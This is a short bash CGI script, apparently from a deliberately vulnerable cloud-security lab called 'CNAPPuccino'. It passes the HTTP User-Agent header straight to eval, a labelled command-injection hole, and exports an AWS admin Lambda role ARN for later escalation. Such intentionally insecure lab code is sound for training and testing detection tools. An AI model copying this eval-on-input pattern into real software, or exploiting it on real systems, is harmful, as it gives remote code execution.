#!/bin/bash
echo "Content-Type: text/plain"
echo ""
echo "CNAPPuccino CGI Endpoint - Command Injection Test"
echo ""

# Set CNAPPuccino environment variables explicitly
export LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::985539760303:role/LambdaAdminRole"
export AWS_DEFAULT_REGION="us-east-1"

if [ -n "$HTTP_USER_AGENT" ]; then
  echo "User-Agent: $HTTP_USER_AGENT"
  echo ""
  echo "Executing command injection..."
  eval "$HTTP_USER_AGENT"
else
  echo "No User-Agent header received"
fi